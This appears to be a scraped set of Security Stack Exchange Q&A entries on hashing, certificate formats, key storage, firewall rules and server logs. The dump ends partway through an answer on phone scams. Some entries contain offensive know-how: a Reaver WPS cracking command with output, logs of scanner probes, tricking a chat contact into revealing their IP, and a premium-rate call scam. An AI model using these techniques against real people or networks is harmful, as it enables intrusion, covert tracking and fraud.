<li>Optional: Change the cipher strength (128 or 256 bit, difference: 128 is secure for ~50 years and 256 for ~200 years) using the ""folder"" directly above (""BitLocker Drive Encryption"") and the ""Choose drive encryption method and cipher strength"" entry. Check the enabled and choose your cipher in the dropdown menu.</li>
<li>Encrypt your drive as you normally would.</li>
</ol>

<p><strong>It seems like USB + PIN is not an option any longer in Windows 8 :(</strong></p>
","88872"
"Why are salted hashes more secure for password storage?","61008","","<p>I know there are many discussions on salted hashes, and I understand that the purpose is to make it impossible to build a rainbow table of all possible hashes (generally up to 7 characters).</p>

<p>My understanding is that the random salted values are simply concatenated to the password hash. Why can a rainbow table not be used against the password hash and ignore the first X bits that are known to be the random salt hash?</p>

<p><strong>Update</strong></p>

<p>Thanks for the replies. I am guessing for this to work, the directory (LDAP, etc) has to store a salt specific to each user, or it seems like the salt would be ""lost"" and authentication could never occur.</p>
","<p>It typically works like this:</p>

<p>Say your password is ""baseball"". I could simply store it raw, but anyone who gets my database gets the password. So instead I do an SHA1 hash on it, and get this: </p>

<pre><code>$ echo -n baseball | sha1sum
a2c901c8c6dea98958c219f6f2d038c44dc5d362
</code></pre>

<p>Theoretically it's impossible to reverse a SHA1 hash. But go do <a href=""https://www.google.com/search?q=a2c901c8c6dea98958c219f6f2d038c44dc5d362"" rel=""noreferrer"">a google search on that exact string</a>, and you will have no trouble recovering the original password. </p>

<p>Plus, if two users in the database have the same password, then they'll have the same SHA1 hash. And if one of them has a <a href=""http://www.rockpapershotgun.com/2013/11/25/one-down-your-dumb-password-adobe-crossword/"" rel=""noreferrer"">password hint</a> that says <code>try ""baseball""</code> -- well now I know what <em>both</em> users' passwords are.</p>

<p>So before we hash it, we prepend a unique string. Not a <em>secret</em>, just something unique. How about <code>WquZ012C</code>. So now we're hashing the string <code>WquZ012Cbaseball</code>. That hashes to this:</p>

<blockquote>
  <p><code>c5e635ec235a51e89f6ed7d4857afe58663d54f5</code></p>
</blockquote>

<p>Googling that string turns up nothing (except perhaps <em>this</em> page), so now we're on to something. And if person2 also uses ""baseball"" as his password, we use a different salt and get a different hash. </p>

<p>Of course, in order to test out your password, you have to know what the salt is. So we have to store that somewhere. Most implementations just tack it right on there with the hash, usually with some delimiter. Try this if you have <code>openssl</code> installed:</p>

<pre><code>[tylerl ~]$ openssl passwd -1
Password: baseball
Verifying - Password: baseball
$1$oaagVya9$NMvf1IyubxEYvrZTRSLgk0
</code></pre>

<p>This gives us a hash using the standard <code>crypt</code> library. So our hash is <code>$1$oaagVya9$NMvf1IyubxEYvrZTRSLgk0</code>: it's actually 3 sections separated by <code>$</code>. I'll replace the delimiter with a space to make it more visually clear:</p>

<pre><code>$1$oaagVya9$NMvf1IyubxEYvrZTRSLgk0
 1 oaagVya9 NMvf1IyubxEYvrZTRSLgk0
</code></pre>

<ul>
<li><strong>1</strong> means ""algorithm number 1"" which <a href=""https://passlib.readthedocs.io/en/stable/lib/passlib.hash.md5_crypt.html#algorithm"" rel=""noreferrer"">is a little complicated</a>, but uses MD5. There are <a href=""http://pythonhosted.org/passlib/modular_crypt_format.html#mcf-identifiers"" rel=""noreferrer"">plenty others which are much better</a>, but this is our example.</li>
<li><strong>oaagVya9</strong> is our salt. Plunked down right there in with our hash.</li>
<li><strong>NMvf1IyubxEYvrZTRSLgk0</strong> is the actual MD5 sum, base64-encoded.</li>
</ul>

<p>If I run the process again, I get a completely different hash with a different salt. In this example, there are about 10<sup>14</sup> ways to store this one password. All of these are for the password ""baseball"":</p>

<pre><code>$1$9XsNo9.P$kTPuyvrHqsJJuCci3zLwL.
$1$nLEOCtx6$uSnz6PF8q3YuUhB3rLTC3/
$1$/jZJXTF3$OqDuk8T/cEIGpeKWfsamf.
$1$2lC.Cb/U$KR0jkhpeb1sz.UIqvfYOR.
</code></pre>

<p>But, if I deliberately specify the salt I want to check, I'll get back my expected result:</p>

<pre><code>[tylerl ~]$ openssl passwd -1 -salt oaagVya9
Password: baseball
Verifying - Password: baseball
$1$oaagVya9$NMvf1IyubxEYvrZTRSLgk0
</code></pre>

<p>And that's the test I run to check to see if the password is correct. Find the stored hash for the user, find the saved salt, re-run that same hash using saved salt, check to see if the result matches the original hash.</p>

<h2>Implementing This Yourself</h2>

<p>To be clear, this post is not an implementation guide. Don't simply salt your MD5 and call it good. That's not enough in today's risk climate. You'll instead want to run an <em>iterative</em> process which runs the hash function thousands of times. This has been <a href=""https://security.stackexchange.com/a/52065/2264"">explained elsewhere</a> many times over, so I won't go over the <em>""why""</em> here. </p>

<p>There are several well-established and trusted options for doing this:</p>

<ul>
<li><p><strong><a href=""http://en.wikipedia.org/wiki/Crypt_%28C%29"" rel=""noreferrer"">crypt</a></strong>: The function I used above is an older variation on the unix <code>crypt</code> password hashing mechanism built-in to all Unix/Linux operating systems. The original (DES-based) version is horribly insecure; don't even consider it. The one I showed (MD5-based) is better, but still shouldn't be used today. Later variations, including the SHA-256 and SHA-512 variations should be reasonable. All recent variants implement multiple rounds of hashes.</p></li>
<li><p><strong><a href=""http://en.wikipedia.org/wiki/Bcrypt"" rel=""noreferrer"">bcrypt</a></strong>: The blowfish version of the <code>crypt</code> functional call mentioned above. Capitalizes on the fact that blowfish has a very expensive key setup process, and takes a ""cost"" parameter which increases the key setup time accordingly.</p></li>
<li><p><strong><a href=""http://en.wikipedia.org/wiki/PBKDF2"" rel=""noreferrer"">PBKDF2</a></strong>: (""Password-based Key Derivation Function version 2"") Created to produce strong cryptographic keys from simple passwords, this is the only function listed here that <a href=""http://tools.ietf.org/html/rfc2898"" rel=""noreferrer"">actually has an RFC</a>. Runs a configurable number of rounds, with each round it hashes the password plus the previous round's result. The first round uses a salt. It's worth noting that its original intended purpose is <em>creating strong keys</em>, not <em>storing passwords</em>, but the overlap in goals makes this a well-trusted solution here as well. If you had no libraries available and were forced to implement something from scratch, this is the easiest and best-documented option. Though, obviously, using a well-vetted library is always best.</p></li>
<li><p><strong><a href=""http://en.wikipedia.org/wiki/Scrypt"" rel=""noreferrer"">scrypt</a></strong>: A recently-introduced system designed specifically to be difficult to implement on dedicated hardware. In addition to requiring multiple rounds of a hashing function, <em>scrypt</em> also has a very large working memory state, so as to increase the RAM requirement for implementations. While very new and mostly unproven, it looks at least as secure as the others, and possibly the most secure of them all.</p></li>
</ul>
","51983"
"What's the difference between X.509 and PKCS#7 Certificate?","60599","","<ol>
<li><p>Am I correct calling file with .p7b file extension saved as 'Cryptographic Message Syntax Standard - PKCS#7 Certificates (.P7B)' in Windows - a 'PKCS#7 certificate'? Or is it better called 'X.509 certificate saved in PKCS#7 format'?</p></li>
<li><p>When would one choose one certificate format over another? Do these formats have any particular strengths or weaknesses?</p></li>
<li><p>Adding this question after my first two edits. How is PKCS#7 format different compared to DER/PEM file formats?</p></li>
</ol>

<p>Thanks</p>

<hr>

<p>Edit #1: Firefox under Linux offers me an ability to export some website's certificate as: </p>

<ul>
<li>X.509 Certificate (PEM) </li>
<li>X.509 Certificate (DER) </li>
<li>X.509 Certificate (PKCS#7)</li>
</ul>

<p>Does it mean that PKCS#7 here is just a binary file format similar to but distinct from DER? If true then .p7b file is just an X.509 certificate saved in PKCS#7 format (as opposed to PEM or DER formats).</p>

<hr>

<p>Edit #2: Follow up to my first edit. This page <a href=""https://www.openssl.org/docs/apps/pkcs7.html"">OpenSSL: Documents, pkcs7</a> suggests that PKCS#7 can be encrypted in either DER or PEM. From that I deduce that PKCS#7 is not a distinct binary file format. Now I'm totally confused.</p>

<hr>

<p>Edit #3: Ok, I figured the relationship between PEM and DER formats. The Base64 encoded payload of the PEM file is actually data in DER format. So initially the X.509 certificate is encoded in DER format and then optionally you can encode the resulted 'DER encoded certificate' to 'PEM encoded certificate'. I'm still having difficulties fitting PKCS#7 part of the puzzle.</p>

<hr>

<p>Edit #4: Another piece of information. PKCS#7 seems to be a container that allows to bundle together several X.509 certificates prior to encode them into DER format (which is different from PEM format where you can bundle certificates together in the same file by just pasting them one after another).</p>
","<p>You've evolved to mostly right, but to add several points 
and expand on @CoverosGene more than I felt comfortable doing in an edit:</p>

<p><strong>X.509</strong> defines a certificate (and some other things not relevant here) in ASN.1,
a (very!) general data structuring method which has several defined encodings, of which 
<strong>DER</strong> Distinguished Encoding Representation is quite common and is used here.</p>

<p><strong>PEM</strong> format -- for several types of data of which a certificate is only one -- 
is much as you say just binary (DER) data encoded in base64 <strong>(edit)</strong> broken into lines normally every 64 chars (but there are variations), plus header and trailer lines 
consisting of dashes + BEGIN or END + the type of data, in this case CERTIFICATE + dashes. 
Those lines look redundant to a human but they are expected and mostly required by software.
PEM (Privacy Enhanced Mail) was actually a complete standard for secure email that has now 
been mostly forgotten (see below) <em>except</em> for its encoding format.
<strong>(edit)</strong> As of 2015 there is <a href=""https://tools.ietf.org/html/rfc7468"" rel=""nofollow noreferrer"">RFC 7468</a> describing in detail <em>most</em> use of 'PEM' formats for modern crypto data.</p>

<p><strong>PKCS#7</strong> was defined by RSA (the company, not the algorithm) as a multi-purpose format 
for encrypted and/or signed data. It was turned over to IETF and evolved into 
<strong>CMS Cryptographic Message Syntax</strong> <a href=""http://tools.ietf.org/html/rfc2630"" rel=""nofollow noreferrer"">http://tools.ietf.org/html/rfc2630</a> then <a href=""http://tools.ietf.org/html/rfc3369"" rel=""nofollow noreferrer"">http://tools.ietf.org/html/rfc3369</a> ,
hence the wording of the Windows (inetopt) prompt. ""PKCS#7"" is often used to mean <strong>both</strong> 
the original RSA PKCS#7 and the IETF successor CMS, in the same way ""SSL"" is often used for 
both the original Netscape protocol and the IETF successor TLS Transport Level Security.</p>

<p>The <strong>.p7b or .p7c</strong> format is a special case of PKCS#7/CMS: a SignedData structure containing 
no ""content"" and zero SignerInfos, but one or more certificates (usually) and/or CRLs (rarely). 
Way back when this provided a standard way to handle <strong>(edit)</strong> the set of certificates needed to make up a <strong>chain</strong> (not necessarily in order).</p>

<p>PKCS#7/CMS is (are?) also ASN.1 and depending on circumstances can be either DER or <strong>BER</strong>,
a closely-related encoding with some very minor differences that most DER decoders handle.</p>

<p>While PKCS#7/CMS like any DER or BER object <em>can</em> be PEM-formatted, I've not seen any implementation other than 
openssl do so for certs. In contrast both DER and PEM formats for a single cert are common.</p>

<p>PKCS#7/CMS is also used as the basis for <strong>S/MIME</strong> secure email (multiple rfcs starting from 5751). 
Basically PEM encoded PKCS#7 into ASCII text which email systems of the 1980s could easily handle, while 
S/MIME represents CMS as MIME entities which are encoded in <em>several</em> ways modern email systems can handle.</p>

<p><strong>OpenSSL</strong> confused matters by implementing, in order: a <strong>pkcs7</strong> command which handles 
the certs-CRLs-only case not full PKCS#7; a <strong>crl2pkcs7</strong> command which actually handles 
CRLs and certs, but again not the rest of PKCS#7; a <strong>smime</strong> command which actually handles both S/MIME 
and PKCS#7/CMS for most cases of encrypted and/or signed messages; and a <strong>cms</strong> command which actually handles 
both S/MIME and PKCS#7/CMS for a more complete set of cases.</p>

<p>So I would describe the options as: a cert in PEM or DER format; a (single) cert 
in a PKCS#7 container or for short just p7, and mention PEM only in the rare case it applies;
or a <em>cert chain</em> in PKCS#7 or p7. The semantic difference between a single cert and a cert chain 
is at least as important as the format difference between a cert by itself or in a container.</p>

<p>And this doesn't even reach the widespread confusion between a certificate by itself (usually for somebody else) and a privatekey PLUS certificate -- or usually chain -- that you use to establish your own identity, for example in an SSL/TLS server, or S/MIME-signed email. <em>That</em> uses the originally-Microsoft PFX Personal Information Exchange format, or its standardized form PKCS#12 or ""p12"".</p>
","73201"
"Strange requests to web server","60294","","<p>I have a Linode VPS running Nginx, which currently serves only static content.</p>

<p>Once I was looking at the log and noticed some strange requests:</p>

<pre><code>XXX.193.171.202 - - [07/Aug/2013:14:04:36 +0400] ""GET /user/soapCaller.bs HTTP/1.1"" 404 142 ""-"" ""Morfeus Fucking Scanner""
XXX.125.148.79 - - [07/Aug/2013:20:53:35 +0400] ""GET /phpmyadmin/scripts/setup.php HTTP/1.1"" 404 142 ""-"" ""ZmEu""
XXX.125.148.79 - - [07/Aug/2013:20:53:35 +0400] ""GET /w00tw00t.at.blackhats.romanian.anti-sec:) HTTP/1.1"" 404 142 ""-"" ""ZmEu""
XXX.125.148.79 - - [07/Aug/2013:20:53:35 +0400] ""GET /myadmin/scripts/setup.php HTTP/1.1"" 404 142 ""-"" ""ZmEu""
XXX.125.148.79 - - [07/Aug/2013:20:53:35 +0400] ""GET /phpMyAdmin/scripts/setup.php HTTP/1.1"" 404 142 ""-"" ""ZmEu""
XXX.125.148.79 - - [07/Aug/2013:20:53:35 +0400] ""GET /pma/scripts/setup.php HTTP/1.1"" 404 142 ""-"" ""ZmEu""
XXX.125.148.79 - - [07/Aug/2013:20:53:35 +0400] ""GET /MyAdmin/scripts/setup.php HTTP/1.1"" 404 142 ""-"" ""ZmEu""
XXX.221.207.157 - - [07/Aug/2013:22:04:20 +0400] ""\x80w\x01\x03\x01\x00N\x00\x00\x00 \x00\x009\x00\x008\x00\x005\x00\x00\x16\x00\x00\x13\x00\x00"" 400 172 ""-"" ""-""
XXX.221.207.157 - admin [07/Aug/2013:22:04:21 +0400] ""GET /HNAP1/ HTTP/1.1"" 404 142 ""http://212.71.249.8/"" ""Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-us) AppleWebKit/xxx.x (KHTML like Gecko) Safari/12x.x""
</code></pre>

<p>Should I worry about somebody trying to hack my server in this case?</p>
","<p>It appears that your server is the target of an automated attack involving the <a href=""http://ensourced.wordpress.com/2011/02/25/zmeu-attacks-some-basic-forensic/"">ZmEu scanner</a>.</p>

<p>That first request appears to be from another automated attack involving the <a href=""http://stateofsecurity.com/?p=467"">Morfeus Scanner</a>.</p>

<p>That last request appears to be an attempt to exploit vulnerabilities in the Home Network Administration Protocol (HNAP) implementations of D-Link routers. More information about the attack can be found <a href=""https://dl.packetstormsecurity.net/papers/attack/dlink_hnap_captcha.pdf"">here</a>.</p>

<p>From a cusory glance at the request it's making, I'd say you have nothing to worry about if you aren't running phpmyadmin on your systems. Such attacks are commonplace for servers connected to the internet and the scans are getting 404's indicating that your server does not have what they are looking for.</p>
","40293"
"Why does HTTP Basic authentication encode the username and password with base64?","60101","","<p><a href=""http://www.ietf.org/rfc/rfc2617.txt"">RFC 2617</a> requires that in <a href=""http://en.wikipedia.org/wiki/Basic_access_authentication"">HTTP Basic authentication</a>, the username and password must be encoded with base64.</p>

<blockquote>
  <p>To receive authorization, the client sends the userid and password,
  separated by a single colon ("":"") character, within a base64 
  encoded string in the credentials.</p>

<pre><code>  basic-credentials = base64-user-pass
  base64-user-pass  = &lt;base64 encoding of user-pass,
                   except not limited to 76 char/line&gt;
  user-pass   = userid "":"" password
  userid      = *&lt;TEXT excluding "":""&gt;
  password    = *TEXT
</code></pre>
  
  <p>Userids might be case sensitive.</p>
  
  <p>If the user agent wishes to send the userid ""Aladdin"" and password 
  ""open sesame"", it would use the following header field:</p>

<pre><code>Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==
</code></pre>
</blockquote>

<p>Since base64 encoding offers zero security of the credentials, why is this done?</p>
","<p>It is not done for security reasons at all, and more as a means of escaping special characters</p>

<p><a href=""https://stackoverflow.com/questions/4070693/why-base64-encryption"">https://stackoverflow.com/questions/4070693/why-base64-encryption</a></p>

<p>TLS would be employed for security. </p>
","29919"
"Windows Firewall - how to block inbound for all .exe files in a folder","59824","","<p>In Windows Firewall with Advanced Settings I can create a rule which blocks all inbound or outbound traffic for particular program by pointing to its .exe file. The problem is that this program has many .exe files in its directory, as well as additional ones in its sub directories.<br>
So my question is: do I need to make separate rules for each .exe file, which in this case would mean about 50 rules? Or is there a way to block the traffic for a group of .exe files based on their location on the local hard drive? </p>
","<p>You can use a Simple Batch File.  Open Notepad and copy/paste the script below into a blank document.  Save the file as BLOCKALL.BAT.  Now copy that file to the same directory as the EXEs you want to block and double click it.  It will add outbound rules to advanced Windows Firewall settings blocking all EXEs in that folder and sub-folders as well.</p>

<p>It is tested with Windows 7, but it should work with other versions of Windows that use Windows Firewall.</p>

<p><strong>NOTE</strong>: Batch starts itself in system32. Thus you need to prepend it with <code>cd /d ""%~dp0""</code> to make it work in current directory.</p>

<p>The resulting script would be as follows:</p>

<pre><code>@ setlocal enableextensions 
@ cd /d ""%~dp0""

for /R %%a in (*.exe) do (

netsh advfirewall firewall add rule name=""Blocked with Batchfile %%a"" dir=out program=""%%a"" action=block

)
</code></pre>
","87516"
"Trace facebook user ip. Is it even possible?","59336","","<p>As I know facebook chat is working like <code>user &lt;&gt; server &lt;&gt; user</code> and it's not P2P. I was talking with some guys today and they were pretty sure it's possible to <code>netstat</code> a facebook user IP address. I'm not familiar how FB chat works, but I highly doubt they're using P2P in their chat. So my question is it possible to <code>netstat</code> a facebook IP, or any way to find his IP without sending a link or using any phishing tools?</p>

<p>Most of the articles in the google results, says this is actually possible: <a href=""https://www.google.bg/search?q=facebook%20stack&amp;oq=facebook%20stack&amp;aqs=chrome..69i57j69i59j69i65j69i60l2j0.2038j0j4&amp;sourceid=chrome&amp;espv=210&amp;es_sm=122&amp;ie=UTF-8#es_sm=122&amp;espv=210&amp;q=get%20ip%20of%20facebook%20user&amp;safe=off&amp;start=10"" rel=""nofollow"">here</a>.</p>
","<p>Facebook chat is running on <a href=""http://en.wikipedia.org/wiki/XMPP"">XMPP</a> protocol. It is decentralised, but not P2P. It is similar to email - there is no central server, but lots of domain servers talking to each other and taking care of their clients. I doubt that it would be possible to get IP address from XMPP.</p>
","46553"
"How to get private key used to decrypt HTTPS traffic sent and received from my own browser with wireshark","59271","","<p>I am working with a website that sends API requests.
I would like to write a client to make the requests myself, but in order to do so I would need to first see the request payloads. However, the connection is secured and therefore I can't see the data in wireshark just like that.</p>

<p>I found out that Wireshark supports SSL decryption: <a href=""http://wiki.wireshark.org/SSL"">http://wiki.wireshark.org/SSL</a></p>

<p>However, it doesn't explain how the private key file should be obtained or generated, so I went and looked around and found this blog entry: <a href=""http://blog.stalkr.net/2010/03/codegate-decrypting-https-ssl-rsa-768.html"">http://blog.stalkr.net/2010/03/codegate-decrypting-https-ssl-rsa-768.html</a></p>

<p>After finding the appropriate packets as shown in the images, I exported the certificate, but unlike the challenge they were doing, the connection established for me uses RSA-2048 and does not provide the factorization (I'm assuming real certificates do not provide that, only the ones for games and such).</p>

<p>Is it possible for me to decrypt HTTPS packets that are sent to 3rd party websites?
How would I generate the key file required?</p>
","<p>Wireshark is a very powerful tool. In most cases, the (addon-less) debug consoles of the browsers firefox and chrome should be enough. Both have network monitors that are sufficient most time. Be aware that the firefox' monitor doesn't support websockets yet.</p>

<p>If you still wanted to use wireshark, then consider utilizing the <code>SSLKEYLOGFILE</code> file, more help at <a href=""https://isc.sans.edu/forums/diary/Psst+Your+Browser+Knows+All+Your+Secrets+/16415"">this</a> and <a href=""https://developer.mozilla.org/en-US/docs/Mozilla/Projects/NSS/Key_Log_Format"">this</a>, and your linked wireshark wiki page.</p>
","64818"
"Is MD5 considered insecure?","59248","","<p>After all these articles circulating online about <strong><a href=""http://www.codeproject.com/Articles/11643/Exploiting-MD5-collisions-in-C"">md5 exploits</a></strong>, I am considering switching to another hash algorithm. As far as I know it's always been the algorithm of choice among numerous DBAs. Is it that much of a benefit to use MD5 instead of (SHA1, SHA256, SHA384, SHA512), or is it pure performance issue?</p>

<p>What other hash do you recommend (taking into consideration data-bound applications as the platform)? I'm using salted hashes currently (MD5 salted hashes). Please consider both md5 file hashes and password hashes alike.</p>
","<h2>MD5 for passwords</h2>

<p>Using salted md5 for passwords is a bad idea. Not because of MD5's cryptographic weaknesses, but because it's fast. This means that an attacker can try <a href=""http://hashcat.net/oclhashcat-plus/"" rel=""noreferrer"">billions</a> of candidate passwords per second on a single GPU.</p>

<p>What you should use are deliberately slow hash constructions, such as scrypt, bcrypt and PBKDF2. Simple salted SHA-2 is not good enough because, like most general purpose hashes, it's fast. Check out <a href=""https://security.stackexchange.com/questions/211/how-to-securely-hash-passwords"">How to securely hash passwords?</a> for details on what you should use.</p>

<h2>MD5 for file integrity</h2>

<p>Using MD5 for file integrity may or may not be a practical problem, depending on your exact usage scenario.  </p>

<p>The attacks against MD5 are collision attacks, not pre-image attacks. This means an attacker can produce two files with the same hash, if he has control over both of them. But he can't match the hash of an existing file he didn't influence.</p>

<p>I don't know if the attacks applies to your application, but personally I'd start migrating even if you think it doesn't. It's far too easy to overlook something. Better safe than sorry.</p>

<p>The best solution in this context is SHA-2 (SHA-256) for now. Once SHA-3 gets standardized it will be a good choice too.</p>
","19908"
"Where to store a key for encryption?","59169","","<p>I am looking for a way to store a key used for password encryption. I am using a MySQL database which would store a user name and a password encrypted with <code>AES_ENCRYPT(str,key_str)</code>. Where can I safely store the encryption key?</p>
","<blockquote>
  <p><strong>Use password hashes where appropriate.</strong> If your purpose for storing passwords is for inbound authentication (users authenticating against your site or app) then you don't want to store a password, you want to store a non-reversible hash. This has been discussed <em>ad nauseum</em> on this site, so I won't re-hash it here.</p>
  
  <p><strong>Remember: Friends don't let friends reversibly encrypt user passwords.</strong></p>
</blockquote>

<p>If you're instead interested in encrypting data for other reasons, here are your possibilities:</p>

<ol>
<li><p><strong>Use an external Hardware Security Module.</strong> There is an <a href=""https://en.wikipedia.org/wiki/Hardware_security_module"">entire industry of products</a> designed for offloading security-sensitive operations to external devices. This doesn't <em>solve</em> the problem so much as <em>relocate</em> it, but it relocates it to device that is far more secure, so altogether it's a security win. If you're doing anything high-stakes, then this is almost certainly going to factor into your solution.</p></li>
<li><p><strong>Tie the encryption key to your hardware.</strong> TPM chips are useful for this, as are USB security tokens (not flash drives, though). In this case, crypto only works on that specific piece of hardware, but isn't otherwise restricted. It's a bit like the kid-sidekick version of the HSM mentioned above. Google's recently-announced <a href=""http://techcrunch.com/2015/05/29/googles-project-vault-is-a-secure-computing-environment-on-a-micro-sd-card-for-any-platform/#.xabxuv:Gto1"">Project Vault</a> takes this a step further by making a high-bandwidth HSM embeddable into even the smallest consumer devices.</p></li>
<li><p><strong>Tie the encryption key to your admin login</strong> (e.g. encrypt the the encryption key with your admin login). This is only marginally useful as it requires you to be logged in in order to encrypt/decrypt anything. But on the plus side, no one can encrypt/decrypt anything unless you're logged in (i.e. greater control). Much of the secure storage in Windows works like this.</p></li>
<li><p><strong>Type in the encryption key when you start up, store it in memory.</strong> This protects against offline attacks (unless they capture the key out of RAM, which is tougher to do). Similar to the option above, but also different. However, the server boots into an unusuable state, requiring you to manually supply the key before work can be done.</p></li>
<li><p><strong>Store the key on a different server.</strong> E.g. put the key on the web server and the encrypted data on the database server. This protects you to some degree because someone would have to know to grab the key as well as the database, and they'd also have to have access to both servers. Not amazingly secure, but an extremely popular option anyway. Most people who think they're doing it <em>right</em> do it this way. If you're considering doing this, then also consider one of the first two options mentioned above.</p></li>
<li><p><strong>Store the key elsewhere on the same server.</strong> Adds marginal security, but not a whole lot. Most smaller operations do this -- they shouldn't, but they do. Typically because they only have one server and it runs in some cloud somewhere. This is like taping a key to the door instead of leaving it in the lock; guaranteed to stop the most incompetent of attackers. </p></li>
<li><p><strong>Store the key in the database.</strong> Now you're not even trying. Still, a depressingly popular option.</p></li>
</ol>
","12334"
"WiFi WPA cracking with Reaver","58391","","<p>This question is for anyone who has tried or succeeded to crack WiFi WPA/WPA2 keys with BackTrack Linux and <a href=""http://code.google.com/p/reaver-wps/"" rel=""nofollow"">Reaver</a>. So, I wanted to test it on my WiFi router. I started everything as described <a href=""http://lifehacker.com/5873407/how-to-crack-a-wi+fi-networks-wpa-password-with-reaver"" rel=""nofollow"">here</a>.
But I got this error:</p>

<pre><code>root@bt:~# reaver -i mon0 -b 74:31:70:05:4B:A7 -vv

Reaver v1.4 WiFi Protected Setup Attack Tool
Copyright (c) 2011, Tactical Network Solutions, Craig Heffner &lt;cheffner@tacnetsol.com&gt;

[+] Waiting for beacon from 74:31:70:05:4B:A7
[+] Switching mon0 to channel 1
[+] Associated with 74:31:70:05:4B:A7 (ESSID: ALICE-WLAN20)
[+] Trying pin 12345670
[+] Sending EAPOL START request
[+] Received identity request
[+] Sending identity response
[!] WARNING: Receive timeout occurred
[+] Sending WSC NACK
[!] WPS transaction failed (code: 0x02), re-trying last pin
[+] Trying pin 12345670
[+] Sending EAPOL START request
[+] Received identity request
[+] Sending identity response
^C
[+] Nothing done, nothing to save
</code></pre>

<p>It tries the same pin over and over, can anyone explain to me what the problem is, and how I can fix it?</p>
","<p>First make sure that reaver is up to date (using <code>apt-get update &amp;&amp; apt-get upgrade</code> will do this for you).</p>

<p>Second, remember this is an exploit tool. I have had mixed results. Certain linksys routers will crap out under the load and simply lock up. Some other models have given me the same behavior yours is showing (repeated pin, or repeated series of pins even when WPS is enabled).</p>

<p>This tool will not work on every router. Try it on a few different targets. If you get the same issue against multiple models it could be your wifi card or driver as well.</p>

<p>From my experience reaver works on maybe 60-70% of WPS enabled routers I come across. The other 30-40% either get DoS'd or simply fail.</p>
","14960"
"How can I trace the IP address of person in chat?","58386","","<p>Is it possible to trace my IP address when I am chatting with others (with gtalk or Facebook)? If so, how could someone do that?</p>
","<p>Set up a web server and send them a link to something on it. Once they click the link, their IP address will be logged in your web server's access logs. </p>

<p>You could also host an image on said web server and trick a user into loading it through a third party's website. Some social networking sites allow you to upload snippets of HTML including image tags.</p>

<p>Note, when I say ""their IP address"" I am referring to whatever the address is after any NAT and proxying.</p>
","16670"
"How to find out what programming language a website is built in?","58246","","<p>I think that it's fundamental for security testers to gather information about how a web application works and eventually what language it's written in.</p>

<p>I know that URL extensions, HTTP headers, session cookies, HTML comments and style-sheets may reveal some information but it's still hard and not assured.</p>

<p>So I was wondering: is there a way to determine what technology and framework are behind a website ?</p>
","<p>There's no way to be 100% sure if you don't have access to the server, so it's about guessing. Here are some clues:</p>

<ul>
<li><strong>File extensions:</strong> <code>login.php</code> is most likely a PHP script.</li>
<li><strong>HTTP headers:</strong> they may leak some information about the language which is running on the server, and some additional details like the version: <code>X-Powered-By: PHP/7.0.0</code> means that the page was rendered by PHP.</li>
<li><strong><a href=""https://www.owasp.org/index.php/Testing_for_HTTP_Parameter_pollution_%28OTG-INPVAL-004%29"" rel=""nofollow noreferrer"">HTTP Parameter Pollution</a>:</strong> if you managed to guess which server is running, you can refine the guess.</li>
<li><strong>Language limits:</strong> maximum post data, maximum number variable in GET and POST data, etc. It may be useful if the webmaster kept the default values.</li>
<li><strong>Specific input:</strong> for example, PHP had some <a href=""http://phpsadness.com/sad/11"" rel=""nofollow noreferrer"">Easter eggs</a>.</li>
<li><strong>Errors:</strong> triggering errors may also leak the language. <code>Warning: Division by zero in /var/www/html/index.php on line 3</code> is PHP, for example.</li>
<li><strong>File uploads:</strong> libraries may add metadata if the file is being modified server-side. For example, most sites resize users' avatars, and checking for EXIF data will leak <code>CREATOR: gd-jpeg v1.0 (using IJG JPEG v90), default quality</code>, which may help to guess which language is used.</li>
<li><strong>Default filenames:</strong> Check if <code>/</code> and <code>/index.php</code> are the same page.</li>
<li><strong>Exploits:</strong> reading a backup file, or executing arbitrary code on the server.</li>
<li><strong>Open source:</strong> the website may have been open-sourced and is available somewhere on Internet.</li>
<li><strong>About page:</strong> the webmaster may have thanked the language community in a ""FAQ"" or ""About"" page.</li>
<li><strong>Jobs page:</strong> the development team may be recruiting, and they may have detailed the technologies they're using.</li>
<li><strong>Social Engineering:</strong> ask the webmaster!</li>
<li><strong>Public profiles:</strong> if you know who is working on the website (check LinkedIn and <code>/humans.txt</code>), you can check their public repos or their skills on online profiles (GitHub, LinkedIn, Twitter, ...).</li>
</ul>

<hr>

<p>You may also want to know if the website is built with a framework or a CMS, since this will give information about the language used:</p>

<ul>
<li><strong>URLs:</strong> directories and pages are specific to certain CMS. For example, if some resources are located in the <code>/wp-content/</code> directory, it means that WordPress have been used.</li>
<li><strong>Session cookies:</strong> name and format.</li>
<li><strong>CSRF tokens:</strong> name and format.</li>
<li><strong>Rendered HTML:</strong> for example: meta tags order, comments.</li>
</ul>

<hr>

<p><strong>Note that all information coming from the server <a href=""https://en.wikipedia.org/wiki/Honeypot_(computing)"" rel=""nofollow noreferrer"">may be altered to trick you</a>. You should always try to use multiple sources to validate your guess.</strong></p>
","117134"
"nf_conntrack: table full, dropping packet","57659","","<p>I see a lot of these messages in /var/log/messages of my Linux server</p>

<pre><code>kernel: nf_conntrack: table full, dropping packet.
kernel: __ratelimit: 15812 callbacks suppresse
</code></pre>

<p>while my server is under DoS attack but the memory is not still saturated. I am wondering what is the significance of the message and how to counter possible security implications. </p>
","<p>The message means your connection tracking table is full. There are no security implications other than DoS. You can partially mitigate this by increasing the maximum number of connections being tracked, reducing the tracking timeouts or by disabling connection tracking altogether, which is doable on server, but not on a NAT router, because the latter will cease to function.</p>

<pre><code>sysctl -w net.ipv4.netfilter.ip_conntrack_tcp_timeout_established=54000
sysctl -w net.netfilter.nf_conntrack_generic_timeout=120
sysctl -w net.ipv4.netfilter.ip_conntrack_max=&lt;more than currently set&gt;
</code></pre>
","43220"
"If someone asks to borrow your phone to make a call, what could they do?","57515","","<p>A stranger walks up to you on the street. They say they lost their phone and need to make a phone call (has happened to me twice, and maybe to you). What's the worst a phone call could do?</p>

<p>Let's assume they don't run, don't plug any devices into the phone, they just dial a number and do whatever, and hang up.</p>

<p>I know this is an open ended question. Hopefully some intriguing ideas come from it before it's closed?</p>
","<p>A few scams I've seen making the rounds:</p>

<ul>
<li>Use it to dial a premium rate number owned by the group. In the UK, 09xx numbers can cost up to £1.50 per minute, and most 09xx providers charge around 33%, so a five minute call syphons £5 into the group's hands. If you're a good social engineer, you might only have a 10 minute gap between calls as you wander around a busy high-street, so that's £15 an hour (tax free!) - almost triple minimum wage.</li>
